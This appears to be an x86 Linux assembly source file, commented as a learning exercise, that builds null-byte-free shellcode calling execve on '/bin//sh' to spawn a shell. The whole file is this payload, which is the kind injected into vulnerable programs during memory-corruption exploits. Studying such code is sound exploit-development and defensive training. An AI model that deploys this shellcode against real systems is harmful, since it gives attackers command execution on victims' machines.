; char *argv[] = {"/bin//sh", NULL}; /*Create pointer have address*/
; execve(argv[0], 0, 0); /*Call execve*/

global _start

section .text

_start:
	xor eax, eax			; Make not \x00
	; Create char *argv[] = {"/bin//sh", NULL}
	push eax				; Push null to esp
	push dword 0x68732f2f	; Push "//sh" with little-eddian to esp
	push dword 0x6e69622f	; Push "/bin" to esp
	mov ebx, esp			; Push address of *argv[] to ebx
	mov edx, eax			; Push 0 to execve
	mov ecx, eax
	mov al, 0xb				; Syscall execve
	int 0x80
